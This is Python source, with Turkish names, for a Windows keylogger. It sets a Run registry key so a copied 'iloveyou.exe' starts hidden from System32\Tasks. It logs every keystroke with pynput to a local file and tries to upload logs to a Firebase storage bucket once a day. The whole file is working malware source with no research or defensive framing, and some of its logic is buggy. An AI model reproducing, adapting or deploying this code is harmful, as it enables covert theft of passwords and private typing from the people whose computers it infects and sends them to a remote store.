import firebase_admin
from firebase_admin import credentials, storage

import os
import shutil
import winreg
import time

from pynput.keyboard import Key, Listener
from datetime import datetime

now = datetime.now()

guncel_tarih = now.strftime("%Y-%m-%d")

count = 0
keys = []

bilgisayar_adi = os.getlogin()

def reg_olustur(nereye_koyucam, adi_ne_bunun, ne_yapicak_bu_sey):
    elektar = winreg.OpenKey(winreg.HKEY_CURRENT_USER, nereye_koyucam, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(elektar, adi_ne_bunun, 0, winreg.REG_SZ, ne_yapicak_bu_sey)
    winreg.CloseKey(elektar)

nereye_koycam = "Software\Microsoft\Windows\CurrentVersion\Run"

adi_ne_bunun = bilgisayar_adi

ne_yapicak_bu_sey = f"C:\Windows\System32\Tasks\iloveyou.exe"

reg_olustur(nereye_koycam, adi_ne_bunun, ne_yapicak_bu_sey)

kaynak_dosya = 'iloveyou.exe'

hedef_dizin = 'C:\Windows\System32\Tasks'

shutil.copy(kaynak_dosya, hedef_dizin)
cred = credentials.Certificate("serviceAccount.json")
firebase_admin.initialize_app(cred, {"storageBucket": "storage bucketiniz"})

bucket = storage.bucket()

yerel_dosya = "iLoveYou"
bulut_path = f"{bilgisayar_adi}/iLoveYou{guncel_tarih}"

sayac = 0
def tus_basildi(key):
    global count, keys, sayac
    count += 1
    print("{0}".format(key))
    keys.append(key)
    current_time = time.strftime("%H:%M")
    if current_time == "23.59":
        if sayac == 0:
            blob = bucket.blob(bulut_path)
            blob.upload_from_filename(yerel_dosya)
            sayac = 1

    if count >= 1:
        count = 0
        dosyaya_yaz(keys)
        keys = []

def dosyaya_yaz(keys):
    with open("iLoveYou.txt", "a", encoding="utf-8") as file:


        for key in keys:

            k = str(key).replace("'", "")

            if k.find("space") > 0:
                if k == "Key.space":
                    file.write("\n")
                    file.write("SPACE BASILDI")
                    file.write("\n")
                else:
                    file.write("\n")
                    file.write("BACKSPACE BASILDI")
                    file.write("\n")

            elif k.find("esc") > 0:
                file.write("\n")
                file.write("ESC BASILDI")
                file.write("\n")

            elif k.find("enter") > 0:
                file.write("\n")
                file.write("ENTER BASILDI")
                file.write("\n")

            elif k.find("alt_gr") > 0:
                file.write("\n")
                file.write("ALT GR BASILDI")
                file.write("\n")

            elif k.find("alt_l") > 0:
                file.write("\n")
                file.write("ALT BASILDI")
                file.write("\n")

            elif k.find("cmd") > 0:
                file.write("\n")
                file.write("WINDOWS TUŞU BASILDI")
                file.write("\n")

            elif k.find("ctrl") > 0:
                file.write("\n")
                file.write("CTRL BASILDI")
                file.write("\n")

            elif k.find("caps_lock") > 0:
                file.write("\n")
                file.write("CAPS LOCK BASILDI")
                file.write("\n")

            elif k.find("shift") > 0:
                file.write("\n")
                file.write("SHIFT BASILDI")
                file.write("\n")

            elif k.find("tab") > 0:
                file.write("\n")
                file.write("TAB BASILDI")
                file.write("\n")

            elif k.find("num_lock") > 0:
                file.write("\n")
                file.write("NUM LOCK BASILDI")
                file.write("\n")

            elif k.find("down") > 0:
                file.write("\n")
                file.write("AŞAĞI YÖN TUŞU BASILDI")
                file.write("\n")

            elif k.find("up") > 0:
                file.write("\n")
                file.write("YUKARI YÖN TUŞU BASILDI")
                file.write("\n")

            elif k.find("right") > 0:
                file.write("\n")
                file.write("SAĞ YÖN TUŞU BASILDI")
                file.write("\n")

            elif k.find("left") > 0:
                file.write("\n")
                file.write("SOL YÖN TUŞU BASILDI")
                file.write("\n")

            elif k.find("x01") > 0:
                file.write("\n")
                file.write("CTRL + A BASILDI")
                file.write("\n")

            elif k.find("x16") > 0:
                file.write("\n")
                file.write("CTRL + V BASILDI")
                file.write("\n")

            elif k.find("101") > 0:
                file.write("5")

            elif k.find("102") > 0:
                file.write("6")

            elif k.find("103") > 0:
                file.write("7")

            elif k.find("104") > 0:
                file.write("8")

            elif k.find("105") > 0:
                file.write("9")

            elif k.find("100") > 0:
                file.write("4")

            elif k.find("99") > 0:
                file.write("3")

            elif k.find("98") > 0:
                file.write("2")

            elif k.find("97") > 0:
                file.write("1")

            elif k.find("96") > 0:
                file.write("0")

            elif k.find("110") > 0:
                file.write(",")

            elif k.find("f1") > 0:
                if k.find("10") > 0:
                    file.write("\n")
                    file.write("F10 BASILDI")
                    file.write("\n")
                elif k.find("11") > 0:
                    file.write("\n")
                    file.write("F11 BASILDI")
                    file.write("\n")
                elif k.find("12") > 0:
                    file.write("\n")
                    file.write("F12 BASILDI")
                    file.write("\n")
                else:
                    file.write("\n")
                    file.write("F1 BASILDI")
                    file.write("\n")

            elif k.find("f2") > 0:
                file.write("\n")
                file.write("F2 BASILDI")
                file.write("\n")

            elif k.find("f3") > 0:
                file.write("\n")
                file.write("F3 BASILDI")
                file.write("\n")

            elif k.find("f4") > 0:
                file.write("\n")
                file.write("F4 BASILDI")
                file.write("\n")

            elif k.find("f5") > 0:
                file.write("\n")
                file.write("F5 BASILDI")
                file.write("\n")

            elif k.find("f7") > 0:
                file.write("\n")
                file.write("F7 BASILDI")
                file.write("\n")

            elif k.find("f8") > 0:
                file.write("\n")
                file.write("F8 BASILDI")
                file.write("\n")

            elif k.find("f9") > 0:
                file.write("\n")
                file.write("F9 BASILDI")
                file.write("\n")

            elif k.find("f6") > 0:
                file.write("\n")
                file.write("F6 BASILDI")
                file.write("\n")

            elif k.find("x03") > 0:
                file.write("\n")
                file.write("CTRL + C BASILDI")
                file.write("\n")

            elif k.find("x13") > 0:
                file.write("\n")
                file.write("CTRL + S BASILDI")
                file.write("\n")

            elif k.find("x11") > 0:
                file.write("\n")
                file.write("CTRL + Q BASILDI")
                file.write("\n")

            elif k.find("x17") > 0:
                file.write("\n")
                file.write("CTRL + W BASILDI")
                file.write("\n")

            elif k.find("x05") > 0:
                file.write("\n")
                file.write("CTRL + E BASILDI")
                file.write("\n")

            elif k.find("x12") > 0:
                file.write("\n")
                file.write("CTRL + R BASILDI")
                file.write("\n")

            elif k.find("x19") > 0:
                file.write("\n")
                file.write("CTRL + Y BASILDI")
                file.write("\n")

            elif k.find("x14") > 0:
                file.write("\n")
                file.write("CTRL + T BASILDI")
                file.write("\n")

            elif k.find("x15") > 0:
                file.write("\n")
                file.write("CTRL + U BASILDI")
                file.write("\n")

            elif k.find("t") > 0:
                file.write("\n")
                file.write("CTRL + I BASILDI")
                file.write("\n")

            elif k.find("x0f") > 0:
                file.write("\n")
                file.write("CTRL + O BASILDI")
                file.write("\n")

            elif k.find("x10") > 0:
                file.write("\n")
                file.write("CTRL + P BASILDI")
                file.write("\n")

            elif k.find("x1b") > 0:
                file.write("\n")
                file.write("CTRL + Ğ BASILDI")
                file.write("\n")

            elif k.find("x1d") > 0:
                file.write("\n")
                file.write("CTRL + Ü BASILDI")
                file.write("\n")

            elif k.find("x1c") > 0:
                file.write("\n")
                file.write("CTRL + , BASILDI")
                file.write("\n")

            elif k.find("delete") > 0:
                file.write("\n")
                file.write("DELETE BASILDI")
                file.write("\n")

            elif k.find("pause") > 0:
                file.write("\n")
                file.write("PAUSE BASILDI")
                file.write("\n")

            elif k.find("break") > 0:
                file.write("\n")
                file.write("BREAK BASILDI")
                file.write("\n")

            elif k.find("delete") > 0:
                file.write("\n")
                file.write("DELETE BASILDI")
                file.write("\n")

            elif k.find("print_screen") > 0:
                file.write("\n")
                file.write("PRINT SCREEN BASILDI")
                file.write("\n")

            elif k.find("home") > 0:
                file.write("\n")
                file.write("HOME BASILDI")
                file.write("\n")

            elif k.find("end") > 0:
                file.write("\n")
                file.write("END BASILDI")
                file.write("\n")

            elif k.find("Key") == -1:
                file.write(k)

with Listener(on_press=tus_basildi) as listener:
    listener.join()